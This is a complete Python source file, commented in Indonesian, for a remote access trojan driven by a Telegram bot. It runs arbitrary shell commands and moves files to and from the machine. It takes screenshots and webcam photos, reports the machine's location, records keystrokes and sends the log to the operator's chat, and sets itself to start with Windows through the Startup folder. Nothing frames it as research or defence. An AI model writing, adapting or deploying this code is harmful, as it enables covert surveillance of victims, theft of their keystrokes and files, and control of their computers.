import telepot
import subprocess
import os

TOKEN = 'TOKEN_BOT_LO'  # Ganti dengan token bot lo
CHAT_ID = 'ID_CHAT_LO'  # Ganti dengan ID chat lo

bot = telepot.Bot(TOKEN)

def handle_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)

def handle_download(filename):
    try:
        with open(filename, 'rb') as f:
            bot.sendDocument(CHAT_ID, f)
        return f'File {filename} berhasil diunduh'
    except FileNotFoundError:
        return f'File {filename} tidak ditemukan'
    except Exception as e:
        return str(e)

def handle_upload(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        return f'File {filename} berhasil diupload'
    except Exception as e:
        return str(e)

def handle_screenshot():
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(os.getcwd(), 'screenshot.png')
        screenshot.save(screenshot_path)
        with open(screenshot_path, 'rb') as f:
            bot.sendPhoto(CHAT_ID, f)
        os.remove(screenshot_path)
        return 'Screenshot berhasil diambil'
    except ImportError:
        return 'Modul pyautogui tidak terinstall'
    except Exception as e:
        return str(e)

def handle_shell(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)

def handle_location():
    try:
        import geocoder
        g = geocoder.ip('me')
        location = f"Latitude: {g.latlng[0]}, Longitude: {g.latlng[1]}"
        return location
    except ImportError:
        return 'Modul geocoder tidak terinstall'
    except Exception as e:
        return str(e)

def handle_webcam():
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            return "Kamera tidak ditemukan"
        
        _, frame = camera.read()
        cv2.imwrite('webcam.jpg', frame)
        camera.release()

        with open('webcam.jpg', 'rb') as f:
            bot.sendPhoto(CHAT_ID, f)
        os.remove('webcam.jpg')
        return 'Foto webcam berhasil diambil'
    except ImportError:
        return 'Modul cv2 tidak terinstall'
    except Exception as e:
        return str(e)

def handle_persistence():
    try:
        import sys
        import shutil
        if getattr(sys, 'frozen', False):
            executable_path = sys.executable
        else:
            executable_path = os.path.abspath(__file__)

        startup_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_name = os.path.basename(executable_path)
        startup_path = os.path.join(startup_folder, script_name + '.lnk')

        if not os.path.exists(startup_path):
            import winshell
            winshell.CreateShortcut(Path=executable_path, Target=startup_path)
            return 'Skrip ditambahkan ke startup'
        else:
            return 'Skrip sudah ada di startup'
    except Exception as e:
        return str(e)

def handle_keylogger(start):
    try:
        import keyboard
        def on_press(event):
            with open('keylog.txt', 'a') as f:
                f.write(event.name)
        
        if start:
            keyboard.on_press(on_press)
            return 'Keylogger dimulai'
        else:
            keyboard.unhook_all()
            with open('keylog.txt', 'rb') as f:
                bot.sendDocument(CHAT_ID, f)
            os.remove('keylog.txt')
            return 'Keylogger dihentikan dan log dikirim'
    except ImportError:
        return 'Modul keyboard tidak terinstall'
    except Exception as e:
        return str(e)

def handle_message(msg):
    chat_id = msg['chat']['id']
    command = msg['text']

    if command.startswith('/exec'):
        cmd = command.split(' ')[1:]
        result = handle_command(cmd)
        bot.sendMessage(chat_id, result)
    elif command.startswith('/download'):
        filename = command.split(' ')[1]
        result = handle_download(filename)
        bot.sendMessage(chat_id, result)
    elif command.startswith('/upload'):
        filename = command.split(' ')[1]
        content = command.split(' ')[2:]
        result = handle_upload(filename, content)
        bot.sendMessage(chat_id, result)
    elif command == '/screenshot':
        result = handle_screenshot()
        bot.sendMessage(chat_id, result)
    elif command.startswith('/shell'):
        cmd = command.split(' ')[1:]
        result = handle_shell(cmd)
        bot.sendMessage(chat_id, result)
    elif command == '/location':
        result = handle_location()
        bot.sendMessage(chat_id, result)
    elif command == '/webcam':
        result = handle_webcam()
        bot.sendMessage(chat_id, result)
    elif command == '/persistence':
        result = handle_persistence()
        bot.sendMessage(chat_id, result)
    elif command == '/keylogger_start':
        result = handle_keylogger(True)
        bot.sendMessage(chat_id, result)
    elif command == '/keylogger_stop':
        result = handle_keylogger(False)
        bot.sendMessage(chat_id, result)
    else:
        bot.sendMessage(chat_id, 'Perintah tidak dikenal')

bot.message_loop(handle_message)
print('Bot siap menerima perintah')
